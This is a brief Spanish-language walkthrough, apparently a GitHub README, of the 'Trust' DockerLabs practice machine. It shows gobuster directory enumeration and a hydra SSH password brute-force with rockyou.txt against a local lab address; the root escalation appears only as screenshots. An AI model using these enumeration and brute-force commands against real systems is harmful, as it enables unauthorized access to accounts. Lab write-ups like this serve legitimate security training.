# TRUST
Primera maquina de dockerlabs

primero ocupamos instalar esto para que las listas de palabras esten en la ubicacion correcta si esque no la tuviesen
sudo apt-get install seclists 
Después de la instalación, verifica la ubicación de la lista de palabras. Puedes usar el siguiente comando para encontrar la ubicación exacta:
dpkg -L seclists | grep Web-Content
Actualiza la ruta en tu comando: Una vez que tengas la ubicación correcta, actualiza la ruta en tu comando gobuste
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/" -x .php,.sh,.py,.txt

Obtenemos un directorio de una pagina al entrar nos sale el nombre de MARIO es el de la cuenta entonces usamos hydra
sudo apt install hydra
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
y luego entramos con el usuario y contrase;a
![image](https://github.com/juniordurval/TRUST/assets/160273751/54387ad9-f2a6-46a8-8f1c-5d46c3574ed6)
y por ultimo nos pasamos a root 
![image](https://github.com/juniordurval/TRUST/assets/160273751/08d9c3e6-ba68-4df0-8b90-cc60b3bfa497)

